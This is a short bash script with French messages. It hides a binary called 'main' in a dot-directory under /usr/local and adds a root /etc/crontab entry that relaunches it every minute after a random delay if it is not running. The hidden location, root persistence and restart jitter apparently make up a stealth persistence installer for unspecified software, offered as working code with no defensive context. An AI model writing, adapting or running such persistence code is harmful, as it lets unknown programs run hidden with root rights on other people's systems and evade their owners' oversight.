#!/bin/bash

HIDDEN_DIR="/usr/local/.main_hidden"
HIDDEN_PATH="$HIDDEN_DIR/main"
LOG_FILE="/var/log/main_cron.log"

if [ ! -d "$HIDDEN_DIR" ]; then
  mkdir -p "$HIDDEN_DIR"
  echo "Dossier $HIDDEN_DIR créé."
fi

if [ ! -f "$HIDDEN_PATH" ]; then
  if [ -f "./main" ]; then
    mv ./main "$HIDDEN_PATH"
    chmod +x "$HIDDEN_PATH"
    echo "Binaire déplacé dans $HIDDEN_PATH."
  else
    echo "Erreur : le fichier ./main n'existe pas."
    exit 1
  fi
else
  echo "Le binaire est déjà dans $HIDDEN_PATH."
fi
CRON_JOB="* * * * * root pgrep -f '$HIDDEN_PATH' > /dev/null || (sleep \$((RANDOM % 271 + 30)); $HIDDEN_PATH &) >> $LOG_FILE 2>&1"

if ! grep -Fq "$CRON_JOB" /etc/crontab; then
  echo "$CRON_JOB" >> /etc/crontab
  echo "Tâche cron ajoutée avec succès."
else
  echo "La tâche cron existe déjà."
fi
